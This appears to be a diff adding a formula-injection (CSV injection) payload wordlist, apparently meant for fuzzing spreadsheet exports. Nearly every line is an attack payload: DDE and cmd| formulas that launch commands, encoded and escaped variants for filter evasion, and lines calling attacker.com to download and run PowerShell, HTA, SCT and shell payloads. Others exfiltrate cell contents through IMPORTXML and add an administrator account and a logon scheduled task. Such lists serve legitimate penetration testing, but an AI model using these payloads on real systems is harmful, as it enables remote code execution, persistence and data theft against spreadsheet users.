@@ -1,0 +1,106 @@
+=1+1
+=1+2+3
+=SUM(1+1)
+=SUM(A1:A10)
+@SUM(1+1)
++1+1
+-1+1
+=1+1+cmd|'/c calc'!A1
+=cmd|'/c calc'!A1
+=cmd|'/c calc'!A0
+=cmd|'/C calc'!A0
+=cmd|'/C notepad'!A1
+=cmd|'/C notepad'!'A1'
+=cmd|' /C calc'!A0
+=cmd|' /C notepad'!'A1'
+@SUM(1+9)*cmd|' /C calc'!A0
+=10+20+cmd|' /C calc'!A0
+=cmd|'/c ping 127.0.0.1'!A1
+=cmd|'/c whoami'!A1
+=cmd|'/c ipconfig'!A1
+DDE ("cmd";"/C calc";"!A0")
+DDE("cmd";"/C calc";"!A0")A0
+=DDE("cmd";"/C calc";"!A0")
+@DDE("cmd";"/C calc";"!A0")
++DDE("cmd";"/C calc";"!A0")
+-DDE("cmd";"/C calc";"!A0")
+=cmd|'/C powershell IEX(wget http://attacker.com/shell.ps1)'!A0
+=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
+=cmd|'/c certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe'!A0
+=cmd|'/c bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe'!A0
+=cmd|'/c mshta http://attacker.com/payload.hta'!A0
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+=cmd|'/c regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll'!A0
+=HYPERLINK("http://attacker.com","Click me")
+=HYPERLINK("http://attacker.com?c=","Click Here")
+=HYPERLINK("file:///C:/Windows/System32/calc.exe","Click")
+@HYPERLINK("http://attacker.com","Click")
++HYPERLINK("http://attacker.com","Click")
+-HYPERLINK("http://attacker.com","Click")
+=IMPORTXML(CONCAT("http://attacker.com/?v=",A1),"//a")
+=IMPORTFEED("http://attacker.com/feed.xml")
+=WEBSERVICE("http://attacker.com")
+@IMPORTXML(CONCAT("http://attacker.com/?v=",A1),"//a")
+=cmd|'/c net user attacker password /add'!A0
+=cmd|'/c net localgroup administrators attacker /add'!A0
+=cmd|'/c schtask /create /tn Task /tr C:\temp\payload.exe /sc onlogon'!A0
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!A1
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell'!A1
+	=1+1
+	=cmd|'/c calc'!A1
+	@SUM(1+1)
+	+1+1
+	-1+1
+	=DDE("cmd";"/C calc";"!A0")
+'=1+1
+'=cmd|'/c calc'!A1
+'@SUM(1+1)
+'+1+1
+'-1+1
+'=DDE("cmd";"/C calc";"!A0")
+%3D1%2B1
+%3Dcmd%7C%27%2Fc%20calc%27%21A1
+%3DDDE%28%22cmd%22%3B%22%2FC%20calc%22%3B%22%21A0%22%29
+%0A=1+1
+%0D=1+1
+%0A=cmd|'/c calc'!A1
+%0D=cmd|'/c calc'!A1
+%09=1+1
+%09=cmd|'/c calc'!A1
+=2+5+cmd|' /C calc'!A0
+=5-3+cmd|' /C calc'!A0
+=5*6+cmd|' /C calc'!A0
+=6/2+cmd|' /C calc'!A0
+=AVERAGE(1,2,3)+cmd|' /C calc'!A0
+=MAX(1,2,3)+cmd|' /C calc'!A0
+=MIN(1,2,3)+cmd|' /C calc'!A0
+@AVG(1+1)*cmd|' /C calc'!A0
+@MAX(1+1)*cmd|' /C calc'!A0
+@MIN(1+1)*cmd|' /C calc'!A0
+=IF(1=1,cmd|'/c calc'!A1,"false")
+=IFERROR(cmd|'/c calc'!A1,"error")
+@IF(1=1,cmd|'/c calc'!A1,"false")
+=CONCATENATE(cmd|'/c calc'!A1)
+=CONCAT(cmd|'/c calc'!A1)
+@CONCATENATE(cmd|'/c calc'!A1)
+=cmd|'/c start cmd'!A1
+=cmd|'/c start powershell'!A1
+=cmd|'/c cmd.exe /c calc'!A1
+=cmd|'/c cmd.exe /k calc'!A1
+=cmd|'/c wmic process call create calc'!A1
+=cmd|'/c wscript C:\temp\payload.vbs'!A1
+=cmd|'/c cscript C:\temp\payload.vbs'!A1
+=cmd|'/c curl http://attacker.com/shell.sh | bash'!A1
+=cmd|'/c wget http://attacker.com/payload -O C:\temp\payload.exe'!A1
+=cmd|'/c type C:\Windows\System32\drivers\etc\hosts'!A1
+=cmd|'/c dir C:\'!A1
+=cmd|'/c tasklist'!A1
+=cmd|'/c netstat -an'!A1
+=cmd|'/c systeminfo'!A1
+=cmd|'/c net user'!A1
+=cmd|'/c net localgroup administrators'!A1
+=EXEC("calc")
+=EXEC("notepad")
+=SYSTEM("calc")
+@EXEC("calc")
+@SYSTEM("calc")
